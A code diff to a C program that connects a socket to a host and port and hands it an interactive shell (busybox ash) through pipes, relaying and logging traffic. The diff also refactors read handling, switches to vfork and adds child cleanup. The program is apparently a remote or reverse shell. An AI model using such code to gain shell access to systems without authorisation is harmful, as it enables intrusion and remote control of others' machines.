@@ -9,6 +9,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/socket.h>
+#include <sys/wait.h>
 
 typedef union
 {
@@ -21,6 +22,12 @@ typedef union
 } pipes_t;
 
 bool g_abort = false;
+
+typedef enum {
+  read_result_ok,
+  read_result_eof,
+  read_result_err
+} read_result_t;
 
 int create_socket(char* host, char* port)
 {
@@ -212,7 +219,7 @@ int run_child(int sock, pipes_t to_child, pipes_t from_child)
     return -1;
   }
 
-  ret = execl("/bin/sh", "-l", "-i", NULL);
+  ret = execlp("/bin/busybox", "ash", "-l", "-m", NULL);
   if (ret < 0)
   {
     dup2(saved_stderr, STDERR_FILENO);
@@ -223,26 +230,25 @@ int run_child(int sock, pipes_t to_child, pipes_t from_child)
   return 0;
 }
 
-int do_read(char* prefix, fd_set* fds, int fd_from, int fd_to)
+read_result_t do_read(char* prefix, fd_set* fds, int fd_from, int fd_to)
 {
   if(FD_ISSET(fd_from, fds) == false)
   {
-    return 0;
+    return read_result_ok;
   }
 
   unsigned char buf[1024] = {0};
   size_t bytes_read = read(fd_from, buf, sizeof(buf));
   if(bytes_read == 0)
   {
-    perror("EOF");
-    return -1;
+    return read_result_eof;
   }
 
   size_t bytes_written = write(fd_to, buf, bytes_read);
   if (bytes_written != bytes_read)
   {
     perror("Failed to write");
-    return -1;
+    return read_result_err;
   }
 
   for(
@@ -254,6 +260,7 @@ int do_read(char* prefix, fd_set* fds, int fd_from, int fd_to)
     dprintf(2, "%s%s\n", prefix, tok);
   }
 
+  return read_result_ok;
 }
 
 void signal_handler(int signal)
@@ -263,13 +270,20 @@ void signal_handler(int signal)
   g_abort = true;
 }
 
-int run_parent(int sock, pipes_t to_child, pipes_t from_child)
+int run_parent(pid_t child_pid, int sock, pipes_t to_child, pipes_t from_child)
 {
   int ret = -1;
   int result = -1;
+  read_result_t read_ret = read_result_err;
 
   signal(SIGCHLD, signal_handler);
   signal(SIGINT, signal_handler);
+
+  pid_t parent_pgid = getpgid(getpid());
+  dprintf(2, "PARENT PGID: %d\n", parent_pgid);
+
+  pid_t child_pgid = getpgid(child_pid);
+  dprintf(2, "CHILD_PGID: %d\n", child_pgid);
 
   ret = close(from_child.fd_write);
   if (ret < 0)
@@ -304,17 +318,27 @@ int run_parent(int sock, pipes_t to_child, pipes_t from_child)
       continue;
     }
 
-    ret = do_read("TX >> ", &read_fds, from_child.fd_read, sock);
-    if (ret < 0)
+    read_ret = do_read("TX >> ", &read_fds, from_child.fd_read, sock);
+    if (read_ret == read_result_err)
     {
       perror("Failed to do_read(from_child.fd_read)");
       break;
     }
+    else if (read_ret == read_result_eof)
+    {
+      result = 0;
+      break;
+    }
 
-    ret = do_read("RX << ", &read_fds, sock, to_child.fd_write);
-    if (ret < 0)
+    read_ret = do_read("RX << ", &read_fds, sock, to_child.fd_write);
+    if (read_ret == read_result_err)
     {
       perror("Failed to do_read(from_child.fd_read)");
+      break;
+    }
+    else if (read_ret == read_result_eof)
+    {
+      result = 0;
       break;
     }
   }
@@ -326,6 +350,7 @@ int main(int argc, char** argv)
 {
   int sock = -1;
   int ret = -1;
+  pid_t pid = -1;
   pipes_t to_child = { -1, -1 };
   pipes_t from_child = { -1, -1 };
 
@@ -354,7 +379,7 @@ int main(int argc, char** argv)
 
     signal(SIGCHLD, SIG_DFL);
 
-    pid_t pid = fork();
+    pid = vfork();
     if (pid < 0) // error
     {
       perror("Failed to fork");
@@ -362,26 +387,43 @@ int main(int argc, char** argv)
     }
     else if (pid == 0) // child
     {
-      dprintf(2, "CHILD\n");
+      dprintf(2, "RUN CHILD\n");
       ret = run_child(sock, to_child, from_child);
       if (ret < 0)
       {
         perror("Failed to run_child");
         break;
       }
+      exit(ret);
     }
-    else //parent
+
+    dprintf(2, "PARENT: %d\n", getpid());
+    dprintf(2, "CHILD: %d\n", pid);
+    dprintf(2, "RUN PARENT\n");
+    ret = run_parent(pid, sock, to_child, from_child);
+    if (ret < 0)
     {
-      pid_t parent = getpid();
-      dprintf(2, "PARENT: %d, CHILD: %d\n", parent, pid);
-      ret = run_parent(sock, to_child, from_child);
-      if (ret < 0)
-      {
-        perror("Failed to run_child");
-        break;
-      }
+      perror("Failed to run_parent");
+      break;
     }
+
   } while(false);
+
+  ret = kill(pid, SIGKILL);
+  if (ret < 0)
+  {
+    perror("Failed to kill");
+  }
+
+  dprintf(2, "Killed PID: %d\n", pid);
+
+  pid_t waited = waitpid(pid, NULL, 0);
+  if (waited != pid)
+  {
+    perror("Failed to wait");
+  }
+
+  dprintf(2, "Waited  PID: %d\n", pid);
 
   if(sock > 0)
   {
